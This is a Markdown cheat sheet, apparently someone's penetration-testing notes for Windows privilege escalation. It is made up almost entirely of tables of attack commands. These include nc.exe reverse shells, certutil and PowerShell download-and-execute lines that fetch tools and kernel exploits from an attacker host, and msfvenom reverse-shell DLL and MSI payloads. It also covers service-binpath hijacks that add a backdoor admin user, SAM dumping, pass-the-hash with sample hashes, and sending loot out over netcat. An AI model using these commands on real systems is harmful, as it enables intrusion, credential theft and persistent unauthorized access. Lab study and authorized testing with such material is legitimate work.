# Windows

* [Variables](#variables)
* [Shell Upgrade](#shell-upgrade)
* [Connect with Creds](#connect-with-creds)
* [Tools](#tools)
  * [DOS](#dos)
  * [PowerShell](#powershell)
  * [Run Tools & Save Results](#run-tools-amp-save-results)
  * [Port Tunneling](#port-tunneling)
* [Methods](#methods)
  * [Services](#Services)
    * [Service Variable](#service-variable)
    * [General Commands](#general-commands)
    * [Insecure Service Paths](#insecure-service-paths)
    * [Unquoted Service Paths](#unquoted-service-paths)
    * [Weak Registry Permissions](#weak-registry-permissions)
    * [Insecure Service Executeables](#insecure-service-executeables)
    * [DLL Hijacking](#dll-hijacking)
  * [Registry](#Registry)
    * [Autoruns](#Autoruns)
    * [Always Install Elevated](#AlwaysInstallElevated)
  * [Passwords](#passwords)
    * [Searching the registry](#searching-the-registry)
    * [Saved Creds](#saved-creds)
    * [Configuration Files](#configuration-files)
    * [SAM](#sam)
    * [Pass the hash](#pass-the-hash)
  * [Scheduled Tasks](#scheduled-tasks)
  * [Insecure GUI Apps](#insecure-gui-apps)
  * [Startup Apps](#startup-apps)
  * [Installed Apps](#installed-apps)
  * [Token Impersonation](#token-impersonation)
* [Exploits](#exploits)

## Variables
| Command Type     | Description               | Command                                        |
|:-----------------|:--------------------------|:-----------------------------------------------|
| Set Variables    | Copy paste to linux terminal | `echo "set LHOST=$lhost & set LPORT1=53 & set LPORT2=443" \| cb` |

## Shell Upgrade
| Command Type | Description | Command |
|:-------------|:------------|:--------|
| Copy (HTTP)  | Copy nc.exe locally | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/nc.exe nc.exe` |
| Copy (SMB)   | Copy nc.exe locally | `copy \\%LHOST%\share\windows\privesc\nc.exe .` |
| Initiate Reverse Shell | Reverse shell with nc.exe (dos) | `nc.exe -e cmd.exe %LHOST% %LPORT1%` |
| Initiate Reverse Shell | Reverse shell with nc.exe (PowerShell) | `nc.exe -e powershell %LHOST% %LPORT2%` |
| Upgrade DOS Shell | Colours for winPEAS | `reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1` |
| Interactive Shell | Can use up down for commands | `rlwrap -r nc -nlvp 443`

## Connect with Creds
| Command Type | Description | Command |
|:-------------|:------------|:--------|
| RDP  | Remote Desktop | `remmina -c rdp://username@$ip` |
| PSexec | From Admin to System | `.\PsExec64.exe -accepteula -i -s cmd.exe` |
| PSexec | From Admin to System | `psexec.exe -i -s cmd.exe` |
| PSexec | Remote Connection | `psexec.py svcorp.com/nina:ThisIsTheUsersPassword14@$ip` | 
| evil-winrm | Remote Connection | `evil-winrm -i $ip -u $user -p $pass` |
| evil-winrm | Connect with HASH | `evil-winrm -i $ip -u administrator -H 4d801e8c043133366056b5cd6fdcc2c7` |
| winexe | Remote Connection | `winexe -U 'admin%password123' //192.168.3.204 cmd.exe`
| winexe | Remote Connection (System) | `winexe -U 'admin%password123' --system //192.168.3.204 cmd.exe`

## Tools
### DOS
| Command Type     | Description               | Command                                         |
|:-----------------|:---------------------------------:|:-----------------------------------------------|
| Copy (SMB)       | Copy Utilities locally    | `copy \\%LHOST%\share\windows\privesc\privesc.7z .` |
| Copy (SMB)       | Copy Utilities locally    | `copy \\%LHOST%\share\windows\privesc\7za.exe .` |
| Copy (SMB)       | Copy Utilities locally    | `copy \\%LHOST%\share\windows\privesc\chisel-x64.exe .` |
| Copy (HTTP)      | If SMB is unavailable     | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/privesc.7z privesc.7z" \| cb` |
| Copy (HTTP)      | If SMB is unavailable     | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/7za.exe 7za.exe" \| cb` |
| Copy (HTTP)      | If SMB is unavailable     | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/winPEAS.exe winPEAS.exe" \| cb`
| Copy (HTTP)      | If SMB is unavailable     | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/chisel-x64.exe chisel-x64.exe" \| cb`
| Copy (HTTP)      | If SMB is unavailable     | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/nc.exe nc.exe" \| cb`
| Copy (HTTP)      | If SMB is unavailable     | `echo "certutil.exe -urlcache -f http://$lhost/shell.exe shell.exe" \| cb`
| Copy (RDP)       | RDP Mapped drive   | `xcopy /E \\TSCLIENT\linux\* .` |
| Extract Archive  | 7zip extract              | `.\7za.exe x privesc.7z` |

### PowerShell
| Command Type     | Description               | Command |
|:-----------------|:--------------------------|:--------|
| Copy (SMB) | Copy Utilities locally | `copy \\%LHOST%\share\windows\privesc\privesc.7z .` |
| Copy (SMB) | Copy Utilities locally (PowerShell) | `copy \\$env:LHOST\share\windows\privesc\7za.exe .` |
| Copy  | Copy Utilities locally | `copy \\$env:LHOST\share\windows\privesc\winPEASx64.exe .` |
| Copy  | Copy Utilities locally | `copy \\$env:LHOST\share\windows\privesc\SharpUp.exe .` |
| Copy  | Copy Utilities locally | `copy \\$env:LHOST\share\windows\privesc\PowerUp.ps1 .` |
| Copy | Copy Utilities locally  | `echo "Invoke-WebRequest http://$lhost/windows/privesc/7za.exe -OutFile 7za.exe" \| cb` | 
| Copy | Copy Utilities locally  | `echo "Invoke-WebRequest http://$lhost/windows/privesc/privesc.7z -OutFile privesc.7z" \| cb` | 
| Copy | Copy Utilities locally  | `echo "Invoke-WebRequest http://$lhost/windows/privesc/chisel-x64.exe -OutFile chisel-x64.exe" \| cb` | 
| Copy | Copy Utilities locally  | `echo "Invoke-WebRequest http://$lhost/windows/privesc/winPEASx64.exe -OutFile winPEASx64.exe" \| cb` | 
| Copy | Copy Utilities locally  | `echo "Invoke-WebRequest http://$lhost/windows/privesc/nc.exe -OutFile nc.exe" \| cb` | 
| Copy | Copy Utilities locally  | `echo "Invoke-WebRequest http://$lhost/windows/privesc/shell.exe -OutFile shell.exe" \| cb` | 
| Download & Run | PowerUp.ps1 | `IEX(New-Object Net.WebClient).DownloadString('http://$env:LHOST/windows/privesc/PowerUp.ps1'); Invoke-AllChecks` |
| Download & Run | jaws-enum.ps1 | `IEX(New-Object Net.webclient).downloadString('http://10.10.14.18/windows/privesc/jaws-enum.ps1')`

### Run Tools & Save Results
| Command Type     | Description               | Command |
|:-----------------|:--------------------------|:--------|
| Priv Check       | All in One    | `winPEAS.exe > winPEAS.txt & SharpUp.exe > SharpUp.txt & windows-privesc-check2.exe --audit -a -o wpc-report & WinPrivCheck.bat > WinPrivCheck.txt & systeminfo > systeminfo.txt` |
| PowerUp | PowerUp |`powershell -nop; . .\PowerUp.ps1; Invoke-AllChecks` |
| SharpUp | SharpUp | `.\SharpUp.exe` |
| Compress         | Compress txt file results | `7za a -t7z privesc.7z *.txt` | 
| Send to host | Send results to Kali SMB | `copy privesc.7z \\192.168.119.127\share` | 
| Send to host     | Send results to Kali host | `nc %LHOST% 235 < privesc.7z`
| Cleanup | Remove utilities | `del *.zip *.exe *.py *.ps1 *.bat *.dll` |
| Cleanup | Copy files to Kali host | `copy * \\%LHOST%\share` | 
| Exploit | Exploit Suggester (Update) | `python /root/wesng/wes.py --update` |
| Exploit | Exploit Suggester | `python /root/wesng/wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only \| less` |

### Port Tunneling
| Command Type     | Description               | Command |
|:-----------------|:--------------------------|:--------|
| Linux Attack host | Waits for client to connect on 9002 | `/opt/chisel/chisel server --reverse --port 9002` |
| Windows Host | Forwards 3306 & 8888 to the attack host | `.\chisel-x64.exe client $env:LHOST:9002 R:3306:localhost:3306 R:8888:localhost:8888` |
| Plink Example | Send Port 445 from Windows host to Linux Kali host | `plink.exe root@192.168.3.135 -R 445:127.0.0.1:445`
| SSH if available | Send Port from 8443 (Windows) to same on Linux locally) `ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184`

## Methods
### Services
#### Service Variable

`set servicename=daclsvc`

#### General Commands
| Info | Command |
|:-----|:--------|
| WinPEAS Service info | `winPEASany.exe quiet servicesinfo` |
| Get list of services | `net start` |
| Get list of services | `wmic service list brief` |
| Get list of services | `sc query` |
| Get list of services (PowerShell) | `services` |
| Get list of services (PowerShell) | `Get-Service` |
| Check service permissions | `sc qc %servicename%` |
| Check rights for different groups | `accesschk.exe  /accepteula -ucqv %servicename%` |
| Modify Service binary path | `sc config %servicename% binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"` |
| Modify Service binary path | `sc config %servicename% binpath= "net user haxor P@ssword123! /add"` | 
| Modify Service binary path | `sc config %servicename% binpath= "net localgroup administrators haxor /add"` | 
| Modify Service binary path | `sc config %servicename% binpath= "cmd \c C:\Temp\nc.exe 10.10.14.18 443 -e cmd.exe"` |
| Modify Service binary path | `sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"` |
| Stop Service | `sc stop servicename` |
| Start Service | `sc start servicename` |
| Restart Service | `wmic service %servicename% call startservice` | 
| Restart Service | `net stop [service name] && net start [service name]` |

#### Insecure Service Paths
| Info | Command |
|:-----|:--------|
| Confirm with accesschk.exe | `.\accesschk.exe /accepteula -uwcqv user %servicename%` |
| Query Service configuration | `sc qc %servicename%` |
| Query Service status | `sc query %servicename%` |
| Modify Service Binary Path | `sc config %servicename% binpath= "\"C:\Privesc\shell.exe""` |
| Start the service | `net start %servicename%` |

#### Unquoted Service Paths
| Info | Command |
|:-----|:--------|
| Confirm permissions with accesschk.exe | `.\accesschk.exe /accepteula -ucqv user %servicename%` |
| Use accesschk to find writeable permissions in binary pathh | `.\accesschk.exe /accepteula -uwdq "C:\Program Files\"`
| Copy shell to path | `copy shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
| Start the service | `net start %servicename%` |

#### Weak Registry Permissions
| Info | Command |
|:-----|:--------|
| Check permissions with PowerShell | `Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List` |
| Check permissions with accesschk.exe | `.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\%servicename%` |
| Verify can start service | `.\accesschk.exe /accepteula -ucqv user %servicename%` |
| Check the current service registry values | `reg query HKLM\System\CurrentControlSet\services\%servicename%` |
| Modify the registy to run custom binary | `reg add HKLM\System\CurrentControlSet\services\%servicename% /v ImagePath /t REG_EXPAND_SZ /d C:\Privesc\shell.exe /f` |
| Start the service | `net start %servicename%` |

#### Insecure Service Executeables
| Info | Command |
|:-----|:--------|
| Verify service executeable can be written | `.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"` |
| Verify can start service | `.\accesschk.exe /accepteula -ucqv user %servicename%` |
| Backup original service executeable | `copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp` |
| Overwrite original with shell | `copy /Y C:\Privesc\shell.exe "C:\Program Files\File Permissions Service\filepermservice.exe"`
| Start the service | `net start %servicename%` |

#### DLL Hijacking
| Info | Command |
|:-----|:--------|
| Verify can start service | `.\accesschk.exe /accepteula -ucqv user %servicename%` |
| Confirm service executeable | `sc qc %servicename%` |
| Run procmon to determin possible dlls to hijack | |
| Create DLL reverse shell | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=53 -f dll -o /root/share/hijackme.dll`
| Download the DLL Payload | `echo "certutil.exe -urlcache -f http://$lhost/hijackme.dll hijackme.dll" \| cb`
| Download the DLL Payload | `echo "Invoke-WebRequest http://$lhost/hijackme.dll -OutFile hijackme.dll" \| cb`
| Place DLL share in appropriate directory | `copy C:\Privesc\hijackme.dll C:\Temp` |
| Stop the service | `net stop %servicename%` |
| Start the service | `net start %servicename%` |

### Registry
#### Autoruns
| Info | Command |
|:-----|:--------|
| WinPEAS Service info | `winPEASany.exe quiet applicationsinfo` |
| Check registry for autoruns | `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |
| Verify permissions on executeable | `.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"` |
| Backup original executeable | `copy "C:\Program Files\Autorun Program\program.exe" C:\Temp` |
| Copy shell executeable over original | `copy /Y shell.exe "C:\Program Files\Autorun Program\program.exe"` |
| Restart Host | `shutdown /f /r /t 1` |

#### AlwaysInstallElevated
| Info | Command | 
|:-----|:--------|
| WinPEAS Credentials info | `winPEASany.exe quiet windowscreds` |
| Confirm value is 1 | `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` |
| This also needs to be 1 | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` |
| Payload 1 (No UAC format) | `msfvenom -p windows/adduser USER=haxor PASS=P@ssword123! -f msi-nouac -o alwe.msi` |
| Payload 2 (UAC not prompted) | `msfvenom -p windows/adduser USER=haxor PASS=P@ssword123! -f msi -o alwe.msi` |
| Payload 3 (Shell) | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f msi -o /root/share/windows/privesc/shell.msi` |
| Download Payload 1 (PowerShell) | `echo "Invoke-WebRequest http://$lhost/windows/privesc/alwe.msi -OutFile alwe.msi" \| cb` |
| Download Payload 2 (PowerShell) | `echo "Invoke-WebRequest http://$lhost/windows/privesc/alwe2.msi -OutFile alwe2.msi" \| cb` |
| Download Payload 2 (PowerShell) | `echo "Invoke-WebRequest http://$lhost/windows/privesc/shell.msi -OutFile shell.msi" \| cb` |
| Download Payload 1 (DOS) | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/shell.msi shell.msi" \| cb` |
| Install Payload 1 | `msiexec /quiet /qn /i alwe.msi` |
| Install Payload 2 | `msiexec /quiet /qn /i alwe2.msi` |
| Install Payload 3 | `msiexec /quiet /qn /i shell.msi` |
| Login Remotely (Evil-WinRm) | `evil-winrm -i $ip -u haxor -p P@ssword123!` |

### Passwords
#### Searching the registry
| Info | Command | 
|:-----|:--------|
| WinPEAS Service info | `winPEASany.exe quiet filesinfo userinfo` |
| Search HKLM | `reg query HKLM /f password /t REG_SZ /s` |
| Search HKCU | `reg query HKCU /f password /t REG_SZ /s` |
| Search for saved login credentials | `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"` |
| Search for putty saved sessions | `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s` |

#### Saved Creds
| Info | Command | 
|:-----|:--------|
| WinPEAS Service info | `winPEASany.exe quiet cmd windowscreds` |
| Check stored credentials | `cmdkey /list` |
| Run command with saved creds | `runas /savecred /user:admin C:\Privesc\shell.exe`

#### Configuration Files
| Info | Command | 
|:-----|:--------|
| WinPEAS Service info | `winPEASany.exe quiet cmd searchfast filesinfo` |
| Recursively search for files in the current directory with "pass" in the name, or ending in ".config" | `dir /s *pass* == *.config` |
| Recursively search for files in the current directory that contain the word "password" and also end in either .xml, .ini, or .txt | `findstr /si password *.xml *.ini *.txt` |

#### SAM
| Info | Command | 
|:-----|:--------|
| WinPEAS Service info | `winPEASany.exe quiet cmd searchfast filesinfo` |
| pwdump (Once file have been copied to linux host in current directory) | `/opt/creddump7/pwdump.py SYSTEM SAM` |

#### Pass the hash
| Info | Command | 
|:-----|:--------|
| Use hash to login | `pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //$ip cmd.exe`
| Use hash to login (System) | `pth-winexe -U --system 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //$ip cmd.exe`


### Scheduled Tasks
| Info | Command | 
|:-----|:--------|
| List all scheduled tasks user can see (dos) | `schtasks /query /fo LIST /v` |
| List all scheduled tasks user can see (PowerShell) | `Get-ScheduledTask \| where {$_.TaskPath -notlike "\Microsoft*"} \| ft TaskName,TaskPath,State` |
| Check permissions on a script running as a scheduled task | `.\accesschk.exe /accepteula -quv user C:\DevTools\CleanUp.ps1`
| Backup script | `copy Cleanup.ps1 C:\Temp\` |
| Modify script | `echo C:\PrivEsc\shell.exe >> CleanUp.ps1` |
| Restor script | `copy /Y C:\Temp\Cleanup.ps1 Cleanup.ps1` |

### Insecure GUI Apps
| Info | Command | 
|:-----|:--------|
| If application is running as admin try File > Open then paste the command to open a command prompt as admin | `file://c:/windows/system32/cmd.exe`

### Startup Apps
| Info | Command | 
|:-----|:--------|
| Check permissions on global application startup directory | `.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"` |
| Create a shortcut to shell.exe | `cscript CreateShortcut.vbs` |

### Installed Apps
| Info | Command | 
|:-----|:--------|
| Enumerate running programs | `tasklist /V` |
| Search for non-standard processes | `.\seatbelt.exe NonstandardProcesses`
| WinPEAS Process info | `winPEASany.exe quiet procesinfo` |

### Token Impersonation
| Info | Command | 
|:-----|:--------|

#### SeImpersonatePrivilege
| Info | Command | 
|:-----|:--------|
| Download Files | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/SeImpersonatePrivilege/JuicyPotato.exe JuicyPotato.exe" \| cb` |
| Download Files | `copy \\%LHOST%\share\windows\privesc\SeImpersonatePrivilege\JuicyPotato.exe` |
| JuicyPotato | `JuicyPotato.exe -l 1337 -p C:\Privesc\shell.exe -t * -c {CLSID}` |

#### SeBackupPrivilege
```PowerShell
$lhost = '10.4.29.43'
Invoke-WebRequest -Uri "http://$lhost/windows/privesc/SeBackupPrivilege/SeBackupPrivilegeCmdLets.dll" -OutFile SeBackupPrivilegeCmdLets.dll
Invoke-WebRequest -Uri "http://$lhost/windows/privesc/SeBackupPrivilege/SeBackupPrivilegeUtils.dll" -OutFile SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege C:\users\administrator\desktop\flag.txt flag2.txt
```

## Exploits

| Exploit | Operating Systems | Command | 
|---------|-------------------|---------|
| PrintSpoofer | ???? | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/printspoofer/PrintSpoofer.exe PrintSpoofer.exe` |
| CVE-2017-0213 - | Windows 10/8.1/7/2016/2010/2008 | `certutil.exe -urlcache -f http://%LHOST%/windows/exploits/CVE-2017-0213_x64.exe CVE-2017-0213_x64.exe` |
| CVE-2019-1405 - | Windows 10 1803 ??? | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/CVE-2019-1405/47684-1.exe 47684-1.exe` |
| MS17-010 [KB4013389] | Windows 7/2008/2003/XP | `Run remote` |
| MS16-135 [KB3199135] | Windows 2016 | `test` |
| MS16-111 [KB3186973] | Windows 10 10586 (32/64)/8.1 | `test`|
| MS16-098 [KB3178466] | Windows 8.1 | `test` |
| MS16-075 [KB3164038] | Windows 2003/2008/7/8/2012 | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS16-075/potato.exe potato.exe` | 
| MS16-098 | Windows 8.1 | `certutil.exe -urlcache -f http://%LHOST%/windows/exploits/MS16-098.exe MS16-098.exe` |
| MS16-032 [KB3143141] | Windows 2008/7/8/10/2012 | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS16-032/x86/ms16-032.exe ms16-032.exe` |
| MS16-032 [KB3143141] | Windows 2008/7/8/10/2012 | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS16-032/x64/ms16-032.exe ms16-032.exe` |
| MS16-016 [KB3136041] | Windows 2008/Vista/7 | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS16-016/39788/EoP.exe EoP.exe & certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS16-016/39788/Shellcode.dll Shellcode.dll` |
| MS15-097 [KB3089656] | Windows 8.1/2012 | `test` | 
| MS15-076 [KB3067505] | Windows 2003/2008/7/8/2012 | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS15-076/Binary/Trebuchet.exe Trebuchet.exe & certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS15-076/Binary/Microsoft.VisualStudio.OLE.Interop.dll Microsoft.VisualStudio.OLE.Interop.dll` |
| MS15-077 [KB3077657] | Windows XP/Vista/Win7/Win8/2000/2003/2008/2012 | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS15-077/ms15-077.exe ms15-077.exe` |
| MS15-061 [KB3057839] | Windows 2003/2008/7/8/2012 | `test` | 
| MS15-051 x86 [KB3057191] | Windows 2003/2008/7/8/2012 | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS15-051/x86/ms15-051.exe ms15-051.exe` | 
| MS15-051 x64 [KB3057191] | Windows 2003/2008/7/8/2012 | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS15-051/x64/ms15-051.exe ms15-051.exe` | 
| MS15-010 [KB3036220] | Windows 2003/2008/7/8 | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS15-010/ms15-010.exe ms15-010.exe` |
| MS15-015 [KB3031432] | Windows 7/8/8.1/2012/RT/2012 R2/2008 R2 | `test` |
| MS15-001 [KB3023266] | Windows 2008/2012/7/8 | `test` | 
| MS16-135 | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS16-135/MS16-135.ps1 MS16-135.ps1` |
| MS16-135 | `certutil.exe -urlcache -f http://%LHOST%/windows/exploits/MS13-053.exe MS13-053.exe` |
| MS11-046 [KB2503665] | Windows 2003/2008/7/XP | `certutil.exe -urlcache -f http://%LHOST%/windows-kernel-exploits/MS11-046/ms11-046.exe ms11-046.exe` | 
| MS06-040 | `copy \\%LHOST\share\windows\exploits\XP\SP1\* .`


#### Untested / Unproven
```
copy \\%LHOST%\share\windows-kernel-exploits\MS16-135\MS16-135.ps1 .
copy \\%LHOST%\share\windows-kernel-exploits\MS16-075\potato.exe .
copy \\%LHOST%\share\windows-kernel-exploits\MS16-032\x64\ms16-032.exe .
copy \\%LHOST%\share\windows-kernel-exploits\CVE-2017-0213\CVE-2017-0213_x64.exe .
copy \\%LHOST%\share\windows\exploits\XP\SP1\* .
```

PowerShell.exe -ExecutionPolicy Bypass -File MS16-135.ps1
https://github.com/SecWiki/windows-kernel-exploits

## Juicy Potato
| Action | Command |
|--------|---------|
| Copy Exploit | `certutil.exe -urlcache -f http://%LHOST%/windows/exploits/JuicyPotato.exe JuicyPotato.exe` |
| Copy Exploit | `copy \\%LHOST%\share\windows\exploits\JuicyPotato.exe .` |
| Copy PsExec64 | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/PsExec64.exe PsExec64.exe` |
| Copy Shell | `certutil.exe -urlcache -f http://%LHOST%/shell.exe shell.exe` |
| CVE-2018-8120 | `copy \\%LHOST%\share\windows-kernel-exploits\CVE-2018-8120\x64.exe` |
| CVE-2018-8120 | `copy \\%LHOST%\share\windows-kernel-exploits\CVE-2018-8120\x86.exe` | 
```